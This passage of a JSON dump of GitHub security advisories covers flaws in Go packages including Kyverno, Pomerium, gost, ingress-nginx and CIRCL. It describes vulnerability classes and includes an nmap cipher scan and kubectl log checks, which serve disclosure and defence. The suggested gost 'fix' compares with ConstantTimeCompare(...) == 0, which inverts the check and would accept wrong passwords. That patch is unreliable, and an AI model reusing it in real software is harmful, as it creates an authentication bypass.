["CWE-326"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-17T17:07:40Z", "nvd_published_at": "2023-05-17T18:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-22fx-6r9m-r8h9", "modified": "2023-06-02T21:18:04Z", "published": "2023-05-05T18:30:17Z", "aliases": ["CVE-2023-29659"], "summary": "libheif vulnerable to segmentation fault via floating point exception", "details": "A Segmentation fault caused by a floating point exception exists in libheif 1.15.1 using crafted heif images via the heif::Fraction::round() function in box.cc, which causes a denial of service.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/strukturag/libheif"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.15.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-29659"}, {"type": "WEB", "url": "https://github.com/strukturag/libheif/issues/794"}, {"type": "WEB", "url": "https://github.com/strukturag/libheif/commit/e05e15b57a38ec411cb9acb38512a1c36ff62991"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/CKAE6NQBA3Q7GS6VTNDZRZZZVPPEFUEZ/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LGKHDCS4HRZE3UGXYYDYPTIPNIBRLQ5L/"}, {"type": "PACKAGE", "url": "github.com/strukturag/libheif"}], "database_specific": {"cwe_ids": ["CWE-369"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-06-02T21:18:04Z", "nvd_published_at": "2023-05-05T16:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-jqvr-j2vg-gjrv", "modified": "2023-06-13T23:50:12Z", "published": "2023-05-30T06:30:25Z", "aliases": ["CVE-2023-34205"], "summary": "Signature validation bypass in github.com/moov-io/signedxml", "details": "In Moov signedxml through 1.0.0, parsing the raw XML (as received) can result in different output than parsing the canonicalized XML. Thus, signature validation can be bypassed via a Signature Wrapping attack (aka XSW).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/moov-io/signedxml"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.1.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-34205"}, {"type": "WEB", "url": "https://github.com/moov-io/signedxml/issues/23"}, {"type": "WEB", "url": "https://github.com/moov-io/signedxml/pull/25"}, {"type": "PACKAGE", "url": "https://github.com/moov-io/signedxml"}, {"type": "WEB", "url": "https://github.com/moov-io/signedxml/releases/tag/v1.1.0"}], "database_specific": {"cwe_ids": ["CWE-347"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-06-06T01:39:24Z", "nvd_published_at": "2023-05-30T04:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-hgv6-w7r3-w4qw", "modified": "2023-05-30T20:07:06Z", "published": "2023-05-30T20:07:06Z", "aliases": [], "summary": "Kyverno vulnerable due to usage of insecure cipher", "details": "### Summary\nInsecure 3DES ciphers are used which may lead to exploitation of the [Sweet32 vulnerability](https://sweet32.info/). Specifically, the ciphers TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) and TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) are allowed. See CVE-2016-2183. This is fixed in Kyverno v1.9.5 and v1.10.0 and no known users have been affected.\n\n### Details\n\nThe ciphers in affected versions can be read using the following command which uses `nmap`:\n\n```sh\n$ kubectl exec -it mypod -n kyverno sh \nkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.\n**nmap -sV --script ssl-enum-ciphers -p 443 kyverno-cleanup-controller** or  \n**nmap -sV --script ssl-enum-ciphers -p 443 kyverno-svc**\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 10:55 UTC\nNmap scan report for kyverno-cleanup-controller (10.103.199.233)\nHost is up (0.000058s latency).\nrDNS record for 10.103.199.233: kyverno-cleanup-controller.kyverno.svc.cluster.local\n\nPORT    STATE SERVICE  VERSION\n443/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n| ssl-enum-ciphers: \n|   TLSv1.2: \n|     ciphers: \n**|       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA (secp256r1) - C**\n|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (secp256r1) - A\n|       TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256 (secp256r1) - A\n**|       TLS_RSA_WITH_3DES_EDE_CBC_SHA (rsa 2048) - C**\n|       TLS_RSA_WITH_AES_128_CBC_SHA (rsa 2048) - A\n|       TLS_RSA_WITH_AES_128_GCM_SHA256 (rsa 2048) - A\n|       TLS_RSA_WITH_AES_256_CBC_SHA (rsa 2048) - A\n|       TLS_RSA_WITH_AES_256_GCM_SHA384 (rsa 2048) - A\n|     compressors: \n|       NULL\n|     cipher preference: client\n|     warnings: \n|       64-bit block cipher 3DES vulnerable to SWEET32 attack\n|   TLSv1.3: \n|     ciphers: \n|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A\n|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A\n|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A\n|     cipher preference: server\n|_  least strength: C\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.72 seconds\n```", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kyverno/kyverno"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.9.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-hgv6-w7r3-w4qw"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/pull/7308"}, {"type": "PACKAGE", "url": "https://github.com/kyverno/kyverno"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/releases/tag/v1.9.5"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-30T20:07:06Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7g2v-2frm-rg94", "modified": "2023-05-23T22:39:22Z", "published": "2023-05-12T09:30:15Z", "aliases": ["CVE-2023-2515"], "summary": "Mattermost Incorrect Authorization vulnerability", "details": "Mattermost fails to restrict a user with permissions to edit other users and to create personal access tokens from elevating their privileges to system admin\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "7.1.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.2.0"}, {"fixed": "7.7.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.8.0"}, {"fixed": "7.8.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.9.0"}, {"fixed": "7.9.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2515"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-05-12T20:17:25Z", "nvd_published_at": "2023-05-12T09:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pvrc-wvj2-f59p", "modified": "2023-05-26T22:00:39Z", "published": "2023-05-26T22:00:39Z", "aliases": ["CVE-2023-33189"], "summary": "Pomerium vulnerable to Incorrect Authorization with specially crafted requests", "details": "### Impact\n\nWith specially crafted requests, incorrect authorization decisions may be made by Pomerium.\n\n### Patches\n\nWe are releasing patch fixes to address this vulnerability going back to `v0.17.X`. Please upgrade to:\n\n- v0.22.2\n- v0.21.4\n- v0.20.1\n- v0.19.2\n- v0.18.1\n- v0.17.4\n\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [pomerium/pomerium](https://github.com/pomerium/pomerium/issues)\n- Email us at [security@pomerium.com](mailto:security@pomerium.com)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.22.0"}, {"fixed": "0.22.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.21.0"}, {"fixed": "0.21.4"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.20.0"}, {"fixed": "0.20.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.19.0"}, {"fixed": "0.19.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.18.0"}, {"fixed": "0.18.1"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.17.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-pvrc-wvj2-f59p"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33189"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/commit/d315e683357a9b587ba9ef399a8813bcc52fdebb"}, {"type": "PACKAGE", "url": "https://github.com/pomerium/pomerium"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/releases/tag/v0.17.4"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/releases/tag/v0.18.1"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/releases/tag/v0.19.2"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/releases/tag/v0.20.1"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/releases/tag/v0.21.4"}, {"type": "WEB", "url": "https://github.com/pomerium/pomerium/releases/tag/v0.22.2"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2023-05-26T22:00:39Z", "nvd_published_at": "2023-05-30T06:16:37Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j327-c69h-4gh8", "modified": "2023-11-16T21:03:49Z", "published": "2023-05-30T15:30:27Z", "aliases": ["CVE-2023-2980"], "summary": "Abstrium Pydio Cells Resource Injection vulnerability", "details": "A vulnerability classified as critical was found in Abstrium Pydio Cells 4.2.0. This vulnerability affects unknown code of the component User Creation Handler. The manipulation leads to improper control of resource identifiers. The attack can be initiated remotely. Upgrading to version 4.2.1 is able to address this issue. It is recommended to upgrade the affected component. The identifier of this vulnerability is VDB-230212.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pydio/cells/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2980"}, {"type": "PACKAGE", "url": "https://github.com/pydio/cells"}, {"type": "WEB", "url": "https://popalltheshells.medium.com/multiple-cves-affecting-pydio-cells-4-2-0-321e7e4712be"}, {"type": "WEB", "url": "https://pydio.com/en/community/releases/pydio-cells/pydio-cells-enterprise-421"}, {"type": "WEB", "url": "https://vuldb.com/?ctiid.230212"}, {"type": "WEB", "url": "https://vuldb.com/?id.230212"}], "database_specific": {"cwe_ids": ["CWE-74", "CWE-99"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-11-16T21:03:49Z", "nvd_published_at": "2023-05-30T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qvqg-6rp8-4p9h", "modified": "2023-05-11T20:40:16Z", "published": "2023-05-11T20:40:16Z", "aliases": [], "summary": "github.com/ipfs/kubo affected by DOS Bitswap unbounded persistent memory leak", "details": "### Impact\nAn attacker is able allocate arbitrarily many bytes in the Bitswap server by sending many `WANT_BLOCK` and or `WANT_HAVE` requests which are queued in an unbounded queue, with allocations that persist even if the connection is closed.\n\nThis affects users accepting or connecting untrusted connections such as by running in the public swarm and no pnet config.\nNodes that are not publicly reachable but connects to untrusted nodes are also vulnerable to the untrusted nodes being connected to since libp2p connections are blindly bidirectional.\n\n### Patches\n- 19feb15833c6f4d6e7f1e1b132efaae96d76481d [`boxo`](https://github.com/ipfs/boxo) update in Kubo\n- GHSA-m974-xj4j-7qv5 patches in boxo\n\n### Workarounds\n\nUse [PNET](https://github.com/ipfs/kubo/blob/master/docs/experimental-features.md#private-networks), [swarm filters](https://github.com/ipfs/kubo/blob/master/docs/config.md#swarmaddrfilters) or [resource manager allows list](https://pkg.go.dev/github.com/libp2p/go-libp2p/p2p/host/resource-manager#readme-allowlisting-multiaddrs-to-mitigate-eclipse-attacks) to block untrusted connections.\n\nNote that using the resource manager will disrupt both client and server features because the bitswap protocol is a message based protocol mixing requests and responses.\n\n### References\n- GHSA-m974-xj4j-7qv5\n- [CVE-2023-25568](https://nvd.nist.gov/vuln/detail/CVE-2023-25568)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/kubo"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.19.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/boxo/security/advisories/GHSA-m974-xj4j-7qv5"}, {"type": "WEB", "url": "https://github.com/ipfs/kubo/security/advisories/GHSA-qvqg-6rp8-4p9h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-25568"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/kubo"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:40:16Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qjrq-hm79-49ww", "modified": "2023-05-30T06:42:29Z", "published": "2023-05-22T19:47:15Z", "aliases": ["CVE-2023-32691"], "summary": "ginuerzh/gost vulnerable to Timing Attack", "details": "[Timing attacks](https://en.wikipedia.org/wiki/Timing_attack) occur when an attacker can guess a secret by observing a difference in processing time for valid and invalid inputs. Sensitive secrets such as passwords, token and API keys should be compared only using a constant-time comparision function.\nMore information on this attack type can be found in [this blog post](https://verboselogging.com/2012/08/20/a-timing-attack-in-action). \n\n# Root Cause Analysis\n\nIn this case, the vulnerability occurs due to the following code.\n\nhttps://github.com/ginuerzh/gost/blob/1c62376e0880e4094bd3731e06bd4f7842638f6a/auth.go#L46-L46\n\nHere, a untrusted input, sourced from a HTTP header, is compared directly with a secret. \nSince, this comparision is not secure, an attacker can mount a side-channel timing attack to guess the password.\n\n# Remediation\n\nThis can be easily fixed using a constant time comparing function such as `crypto/subtle`'s `ConstantTimeCompare`. \nAn example fix can be found in https://github.com/runatlantis/atlantis/commit/48870911974adddaa4c99c8089e79b7d787fa820 Alternatively, one can apply the patch below\n\n```\nFrom d18cff85e1a565f688f717fd8f2cacea62ff9dbf Mon Sep 17 00:00:00 2001\nFrom: Porcupiney Hairs <porcupiney.hairs@protonmail.com>\nDate: Sun, 7 May 2023 01:03:33 +0530\nSubject: [PATCH] Fix : Timing attack\n\n---\n auth.go | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a/auth.go b/auth.go\nindex 1be96e9..be13f23 100644\n--- a/auth.go\n+++ b/auth.go\n@@ -2,6 +2,7 @@ package gost\n \n import (\n \t\"bufio\"\n+\t\"crypto/subtle\"\n \t\"io\"\n \t\"strings\"\n \t\"sync\"\n@@ -43,7 +44,8 @@ func (au *LocalAuthenticator) Authenticate(user, password string) bool {\n \t}\n \n \tv, ok := au.kvs[user]\n-\treturn ok && (v == \"\" || password == v)\n+\tpassOk := subtle.ConstantTimeCompare([]byte(password), []byte(v)) == 0\n+\treturn ok && (v == \"\" || passOk)\n }\n \n // Add adds a key-value pair to the Authenticator.\n-- \n2.25.1\n\n```", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ginuerzh/gost"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "2.11.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ginuerzh/gost/security/advisories/GHSA-qjrq-hm79-49ww"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32691"}, {"type": "PACKAGE", "url": "https://github.com/ginuerzh/gost"}, {"type": "WEB", "url": "https://github.com/ginuerzh/gost/blob/1c62376e0880e4094bd3731e06bd4f7842638f6a/auth.go#L46"}], "database_specific": {"cwe_ids": ["CWE-203"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-22T19:47:15Z", "nvd_published_at": "2023-05-30T04:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g82w-58jf-gcxx", "modified": "2023-06-07T16:04:02Z", "published": "2023-05-26T13:59:19Z", "aliases": ["CVE-2023-2878"], "summary": "secrets-store-csi-driver discloses service account tokens in logs", "details": "A security issue was discovered in secrets-store-csi-driver where an actor with access to the driver logs could observe service account tokens.  These tokens could then potentially be exchanged with external cloud providers to access secrets stored in cloud vault solutions.  Tokens are only logged when [TokenRequests is configured in the CSIDriver object](https://kubernetes-csi.github.io/docs/token-requests.html) and the driver is set to run at log level 2 or greater via the -v flag.\n\n\nThis issue has been rated MEDIUM [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) (6.5), and assigned CVE-2023-2878\n\n\n### Am I vulnerable?\n\nYou may be vulnerable if [TokenRequests is configured in the CSIDriver object](https://kubernetes-csi.github.io/docs/token-requests.html) and the driver is set to run at log level 2 or greater via the -v flag.\n\n\nTo check if token requests are configured, run the following command:\n\n```bash\nkubectl get csidriver secrets-store.csi.k8s.io -o jsonpath=\"{.spec.tokenRequests}\"\n```\n\nTo check if tokens are being logged, examine the secrets-store container log:\n\n```bash\nkubectl logs -l app=secrets-store-csi-driver -c secrets-store -f | grep --line-buffered \"csi.storage.k8s.io/serviceAccount.tokens\"\n```\n\n### Affected Versions\n\n- secrets-store-csi-driver < 1.3.3\n\n\n### How do I mitigate this vulnerability?\n\nPrior to upgrading, this vulnerability can be mitigated by running secrets-store-csi-driver at log level 0 or 1 via the -v flag.\n\n\n### Fixed Versions\n\n\n- secrets-store-csi-driver >= 1.3.3\n\n\nTo upgrade, refer to the documentation: https://secrets-store-csi-driver.sigs.k8s.io/getting-started/upgrades.html#upgrades\n\n\n### Detection\n\n\nExamine cloud provider logs for unexpected token exchanges, as well as unexpected access to cloud vault secrets.\n\n\nIf you find evidence that this vulnerability has been exploited, please contact [security@kubernetes.io](https://groups.google.com/)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "sigs.k8s.io/secrets-store-csi-driver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver/security/advisories/GHSA-g82w-58jf-gcxx"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-2878"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/118419"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver"}, {"type": "WEB", "url": "https://github.com/kubernetes-sigs/secrets-store-csi-driver/releases/tag/v1.3.3"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/5K8ghQHBDdQ/m/Udee6YUgAAAJ"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20230814-0003/"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-26T13:59:19Z", "nvd_published_at": "2023-06-07T15:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-863x-868h-968x", "modified": "2023-06-02T23:35:19Z", "published": "2023-05-24T18:30:26Z", "aliases": ["CVE-2021-25748"], "summary": "Ingress-nginx `path` sanitization can be bypassed with newline character", "details": "A security issue was discovered in ingress-nginx where a user that can create or update ingress objects can use a newline character to bypass the sanitization of the `spec.rules[].http.paths[].path` field of an Ingress object (in the `networking.k8s.io` or `extensions` API group) to obtain the credentials of the ingress-nginx controller. In the default configuration, that credential has access to all secrets in the cluster.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/ingress-nginx"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-25748"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/issues/8686"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/pull/8623"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/ingress-nginx"}, {"type": "WEB", "url": "https://github.com/kubernetes/ingress-nginx/releases/tag/controller-v1.2.1"}, {"type": "WEB", "url": "https://groups.google.com/g/kubernetes-security-announce/c/avaRYa9c7I8"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-24T21:55:34Z", "nvd_published_at": "2023-05-24T17:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2q89-485c-9j2x", "modified": "2023-05-24T18:31:42Z", "published": "2023-05-11T20:40:54Z", "aliases": ["CVE-2023-1732"], "summary": "Improper random reading in CIRCL", "details": "### Impact\nWhen sampling randomness for a shared secret, the implementation of Kyber and FrodoKEM, did not check whether `crypto/rand.Read()` returns an error. In rare deployment cases (error thrown by the `Read()` function), this could lead to a predictable shared secret.\n\nThe tkn20 and blindrsa components did not check whether enough randomness was returned from the user provided randomness source. Typically the user provides `crypto/rand.Reader`, which in the vast majority of cases will always return the right number random bytes. In the cases where it does not, or the user provides a source that does not, the blinding for blindrsa is weak and integrity of the plaintext is not ensured in tkn20.\n\n\n### Patches\nThe fix was introduced in CIRCL v. 1.3.3\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cloudflare/circl"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cloudflare/circl/security/advisories/GHSA-2q89-485c-9j2x"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-1732"}, {"type": "WEB", "url": "https://github.com/cloudflare/circl/commit/ff8d91225f8954b4970b6d6382d2e4c78f4a4cf8"}, {"type": "PACKAGE", "url": "https://github.com/cloudflare/circl"}, {"type": "WEB", "url": "https://github.com/cloudflare/circl/releases/tag/v1.3.3"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-755"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:40:54Z", "nvd_published_at": "2023-05-10T12:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-33hq-f2mf-jm3c", "modified": "2023-06-01T04:07:20Z", "published": "2023-05-25T16:58:48Z", "aliases": ["CVE-2023-33191"], "summary": "kyverno seccomp control can be circumvented", "details": "### Impact\n\nUsers of the podSecurity (`validate.podSecurity`) subrule in Kyverno versions v1.9.2 and v1.9.3 may be unable to enforce the check for the Seccomp control at the baseline level when using a `version` value of `latest`. There is no effect if a version number is referenced instead. See the [documentation](https://kyverno.io/docs/writing-policies/validate/#pod-security) for information on this subrule type. Users of Kyverno v1.9.2 and v1.9.3 are affected.\n\n### Patches\n\nv1.9.4\nv1.10.0\n\n### Workarounds\n\nTo work around this issue without upgrading to v1.9.4, temporarily install individual policies for the respective Seccomp checks in baseline [here](https://kyverno.io/policies/pod-security/baseline/restrict-seccomp/restrict-seccomp/) and restricted [here](https://kyverno.io/policies/pod-security/restricted/restrict-seccomp-strict/restrict-seccomp-strict/).\n\n### References\n\n* https://kyverno.io/docs/writing-policies/validate/#pod-security\n* https://github.com/kyverno/kyverno/pull/7263\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kyverno/kyverno"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.9.2"}, {"fixed": "1.9.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-33hq-f2mf-jm3c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-33191"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/pull/7263"}, {"type": "PACKAGE", "url": "https://github.com/kyverno/kyverno"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/releases/tag/v1.9.4"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-25T16:58:48Z", "nvd_published_at": "2023-05-30T07:15:09Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9x7h-ggc3-xg47", "modified": "2023-05-17T12:57:59Z", "published": "2023-05-08T15:30:20Z", "aliases": ["CVE-2023-30019"], "summary": "imgproxy is vulnerable to Server-Side Request Forgery", "details": "imgproxy prior to version 3.15.0 is vulnerable to Server-Side Request Forgery (SSRF) due to a lack of sanitization of the imageURL parameter.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/imgproxy/imgproxy/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.15.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-30019"}, {"type": "WEB", "url": "https://github.com/imgproxy/imgproxy/commit/1a9768a2c682e88820064aa3d9a05ea234ff3cc4"}, {"type": "WEB", "url": "https://breakandpray.com/cve-2023-30019-ssrf-in-imgproxy/"}, {"type": "PACKAGE", "url": "https://github.com/imgproxy/imgproxy"}, {"type": "WEB", "url": "https://github.com/imgproxy/imgproxy/blob/ee9e8f0cb101ec22318caffd552a23cc0548d5ce/imagedata/download.go#L142"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-05-11T20:34:50Z", "nvd_published_at": "2023-05-08T15:15:11Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m974-xj4j-7qv5", "modified": "2023-05-11T20:32:18Z", "published": "2023-05-11T20:32:18Z", "aliases": ["CVE-2023-25568"], "summary": "Boxo bitswap/server: DOS unbounded persistent memory leak", "details": "### Impact\nAn attacker is able allocate arbitrarily many bytes in the Bitswap server by sending many `WANT_BLOCK` and or `WANT_HAVE` requests which are queued in an unbounded queue, with allocations that persist even if the connection is closed.\nThis affects users accepting untrusted connections with the Bitswap server, this also affects users using the old API stubs at `github.com/ipfs/boxo/bitswap` because it transitively uses `github.com/ipfs/boxo/bitswap/server`.\n\nWe have [renamed go-libipfs to boxo](https://github.com/ipfs/boxo/issues/215); this document uses both terms interchangeably. The version numbers for both are applicable, as they share the same historical timeline.\n\n### Remediation\nApply one of:\n- Update `boxo` to [`v0.6.0`](https://github.com/ipfs/boxo/releases/tag/v0.6.0) or later\n- 